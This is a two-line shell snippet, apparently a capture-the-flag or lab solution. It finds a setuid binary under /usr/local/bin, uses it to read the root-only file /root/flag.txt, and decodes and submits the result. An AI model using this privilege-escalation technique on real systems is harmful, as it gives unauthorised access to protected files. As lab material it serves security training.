bin=$(find / -perm -4000 -type f 2>/dev/null | grep /usr/local/bin/ | head -1)
lab submit "$("$bin" /root/flag.txt | xxd -r)"
